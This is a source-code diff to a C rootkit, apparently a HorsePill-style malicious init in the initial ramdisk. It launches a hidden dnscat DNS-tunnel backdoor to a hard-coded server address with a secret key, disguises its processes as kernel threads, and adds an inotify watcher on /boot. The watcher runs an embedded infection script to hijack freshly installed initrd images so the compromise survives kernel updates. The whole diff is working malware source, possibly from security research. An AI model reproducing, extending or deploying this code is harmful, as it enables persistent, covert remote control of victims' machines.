@@ -5,12 +5,14 @@
 #include <fcntl.h>
 #include <linux/reboot.h>
 #include <linux/sched.h>
+#include <poll.h>
 #include <sched.h>
 #include <signal.h>
 #include <stdint.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <sys/inotify.h>
 #include <sys/mman.h>
 #include <sys/mount.h>
 #include <sys/prctl.h>
@@ -19,11 +21,13 @@
 #include <sys/syscall.h>
 #include <sys/sysmacros.h>
 #include <sys/types.h>
+#include <sys/utsname.h>
 #include <sys/wait.h>
 #include <unistd.h>
 
 #include "dnscat.h"
 #include "horsepill.h"
+#include "infect.h"
 
 #ifndef __NR_clone3
 #define __NR_clone3 -1
@@ -54,12 +58,16 @@
 #define G3LBIN(x) (void)x
 #define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 
-#define DNSCAT_PATH "/lost+found/dnscat"
+#define DNSCAT_PATH     "/lost+found/dnscat"
+#define INFECT_PATH     "/lost+found/infect.sh"
 
-static char *const ARGV0 = "dnscat\0";
-static char *const ARGV1 = "--dns\0";
-static char *const ARGV2 = "server=192.168.1.197,port=53\0";
-static char *const ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
+static char *const DNSCAT_ARGV0 = "dnscat\0";
+static char *const DNSCAT_ARGV1 = "--dns\0";
+static char *const DNSCAT_ARGV2 = "server=172.20.10.2,port=53\0";
+static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
+
+static char *const INFECT_ARGV0 = "infect.sh\0";
+static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
 
 static pid_t init_pid;
 char **cmdline_ptr;
@@ -76,10 +84,8 @@ static void set_process_name(char *name)
 
         memset((void*)buf, 0, sizeof(buf));
         strncpy(buf, name + 1, strlen(name) - 2);
-        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
-                printf("prctl set name returned error!\n");
-                exit(EXIT_FAILURE);
-        }
+        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0)
+                err_exit("prctl set name returned error!");
         memset((void *)cmdline_ptr[0], 0, 32);
         strcpy(cmdline_ptr[0], name);
 }
@@ -96,6 +102,7 @@ static void make_fake_kthreads(char **threads)
                  * the fake kernel threads
                  */
                 G3LBIN(sigfillset(&set));
+                G3LBIN(sigdelset(&set, SIGINT));
                 G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
 
                 set_process_name(threads[0]);
@@ -240,48 +247,194 @@ static void handle_init_exit(int wstatus)
         err_exit(msg);
 }
 
-void write_dnscat_exe()
+static void write_file(char *dest, unsigned char source[], unsigned int len)
 {
         FILE* file = NULL;
-	file = fopen(DNSCAT_PATH, "w+");
+	file = fopen(dest, "w+");
 	if (file) {
-		(void)fwrite((const void *)dnscat, 1, dnscat_len, file);
-		(void)fclose(file);
-		(void)chmod(DNSCAT_PATH, S_IXUSR | S_IRUSR);
+		G3LBIN(fwrite((const void *)source, 1, len, file));
+		G3LBIN(fclose(file));
+		G3LBIN(chmod(dest, S_IXUSR | S_IRUSR));
 	}
 }
 
-static pid_t run_dnscat_client()
+static pid_t execv_wrapper(const char *path, char *const *argv)
 {
 	pid_t pid;
 
 	pid = fork();
 	if (pid < 0) {
-		printf("couldn't fork!\n");
-		exit(EXIT_FAILURE);
+		err_exit("couldn't fork!");
 	} else if (pid == 0) {
 		/* child */
-		char *const argv[5] = {
-                        ARGV0,
-                        ARGV1,
-                        ARGV2,
-                        ARGV3,
-                        NULL
-                };
-
-		close(0);
-		close(1);
-		close(2);
+		G3LBIN(close(0));
+		G3LBIN(close(1));
+		G3LBIN(close(2));
 
 		G3LBIN(open("/dev/null", O_RDONLY));
 		G3LBIN(open("/dev/null", O_WRONLY));
 		G3LBIN(open("/dev/null", O_RDWR));
 
-		execv(DNSCAT_PATH, argv);
+		G3LBIN(execv(path, argv));
 
-		err_exit("couldn't run dnscat!");
+		err_exit("execv");
 	}
 	return pid;
+}
+
+static void preserve_hacked_initrd(char *filename)
+{
+        char initrd_name[512];
+        struct utsname utsdata;
+        pid_t infect_pid;
+        pid_t pid;
+        char *const infect_argv[3] = {
+                INFECT_ARGV0,
+                INFECT_ARGV1,
+                NULL
+        };
+
+        if (uname(&utsdata) < 0)
+                err_exit("uname");
+        
+        sprintf(initrd_name, "initrd.img-%s", utsdata.release);
+        if (strcmp(filename, initrd_name) == 0) {
+                /* overwrite */
+                infect_pid = execv_wrapper(INFECT_PATH, infect_argv);
+retry:
+                pid = waitpid(infect_pid, NULL, 0);
+                if (pid < 0) {
+                        if (errno != EINTR) {
+                                err_exit("watipid returned error!");
+                        } else {
+                                /* interrupted via signal */
+                                goto retry;
+                        }
+                }
+        }
+}
+
+/* Read all available inotify events from the file descriptor 'fd'.
+        wd is the table of watch descriptors for the directories in argv.
+        argc is the length of wd and argv.
+        argv is the list of watched directories.
+        Entry 0 of wd and argv is unused. */
+
+static void handle_events(int fd, const char *dirname)
+{
+        /* Some systems cannot read integer variables if they are not
+        properly aligned. On other systems, incorrect alignment may
+        decrease performance. Hence, the buffer used for reading from
+        the inotify file descriptor should have the same alignment as
+        struct inotify_event. */
+
+        char buf[4096]
+                __attribute__ ((aligned(__alignof__(struct inotify_event))));
+        const struct inotify_event *event;
+        ssize_t len;
+        int overwrite = 0;
+        
+
+        /* Loop while events can be read from inotify file descriptor. */
+
+        for (;;) {
+
+                /* Read some events. */
+
+                len = read(fd, buf, sizeof(buf));
+                if (len == -1 && errno != EAGAIN)
+                        err_exit("read");
+
+                /* If the nonblocking read() found no events to read, then
+                        it returns -1 with errno set to EAGAIN. In that case,
+                        we exit the loop. */
+
+                if (len <= 0)
+                        break;
+
+                /* Loop over all events in the buffer. */
+
+                for (char *ptr = buf; ptr < buf + len;
+                        ptr += sizeof(struct inotify_event) + event->len) {
+
+                        event = (const struct inotify_event *) ptr;
+
+                        /* Check event type. */
+
+                        if ((event->mask & IN_CREATE) ||
+                            (event->mask & IN_MOVED_TO))
+                                overwrite = 1;
+
+                        /* Hijack the legitimate ramdisk installation. */
+
+                        if (event->len && overwrite) {
+                                preserve_hacked_initrd((char *)event->name);
+                                overwrite = 0;
+                        }
+                }
+        }
+}
+
+static pid_t run_watcher()
+{
+        pid_t pid;
+
+        pid = fork();
+	if (pid < 0) {
+		err_exit("couldn't fork!");
+	} else if (pid == 0) {
+		/* child */
+
+                int fd, poll_num;
+                int wd;
+                nfds_t nfds;
+                struct pollfd fds[1];
+                const char *dirname = "/boot";
+
+                /* Create the file descriptor for accessing the inotify API. */
+
+                fd = inotify_init();
+                if (fd == -1)
+                        err_exit("inotify_init");
+                fcntl(fd, F_SETFL, O_NONBLOCK);
+
+                /* Mark directory for events
+                - file was created
+                - file was renamed */
+
+                wd = inotify_add_watch(fd, dirname, IN_CREATE | IN_MOVED_TO);
+                if (wd == -1)
+                        err_exit("inotify_add_watch");
+
+                /* Prepare for polling. */
+
+                nfds = 1;
+
+                fds[0].fd = fd;                 /* Inotify input */
+                fds[0].events = POLLIN;
+
+                /* Wait for events. */
+
+                while (1) {
+                        poll_num = poll(fds, nfds, -1);
+                        if (poll_num == -1) {
+                                if (errno == EINTR)
+                                        continue;
+                                err_exit("poll");
+                        }
+
+                        if (poll_num > 0) {
+
+                                if (fds[0].revents & POLLIN) {
+
+                                        /* Inotify events are available. */
+
+                                        handle_events(fd, dirname);
+                                }
+                        }
+                }
+        }
+        return pid;
 }
 
 void do_attack()
@@ -308,10 +461,14 @@ void do_attack()
                 int wstatus;
                 pid_t pid;
                 pid_t dnscat_pid;
-
-                /* plop a ramdisk over lost+found for our use */
-		if (mount("tmpfs", "/lost+found", "tmpfs", MS_PRIVATE | MS_STRICTATIME, "mode=755") < 0)
-                        err_exit("couldn't mount ramdisk!");
+                pid_t initrd_watcher;
+                char *const dnscat_argv[5] = {
+                        DNSCAT_ARGV0,
+                        DNSCAT_ARGV1,
+                        DNSCAT_ARGV2,
+                        DNSCAT_ARGV3,
+                        NULL
+                };
 
                 /* install signal handler to handle signal delivered
                  * ctrl-alt-delete, which we will send to child init
@@ -326,13 +483,22 @@ void do_attack()
 		 */
 		sleep(20);
 
+                /* remount root to write on it */
 		if (mount(NULL, "/", NULL, MS_REMOUNT | MS_RELATIME,
 			  "errors=remount-ro,data=ordered") < 0)
                         err_exit("couldn't remount /");
 
-                /* spawn a process for backdoor shell */
-		write_dnscat_exe();
-		dnscat_pid = run_dnscat_client();
+                /* mount scratch space over lost+found for our use */
+		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
+                        err_exit("couldn't mount ramdisk!");
+
+                /* spawn a process for backdoor shell and a process
+                 * to observe ramdisk updates
+                 */
+		write_file(DNSCAT_PATH, dnscat, dnscat_len);
+                write_file(INFECT_PATH, infect, infect_len);
+		dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
+                initrd_watcher = run_watcher();
 
                 /* watching for dnscat exit
                  * also, watching for reinfection
@@ -350,7 +516,9 @@ void do_attack()
                         } else if (pid == init_pid) {
                                 handle_init_exit(wstatus);
                         } else if (pid == dnscat_pid) {
-                         	dnscat_pid = run_dnscat_client();
+                         	dnscat_pid = execv_wrapper(DNSCAT_PATH, dnscat_argv);
+                        } else if (pid == initrd_watcher) {
+                         	initrd_watcher = run_watcher();
                         } else {
                                 printf("unknown other pid %d exited\n", pid);
                         }
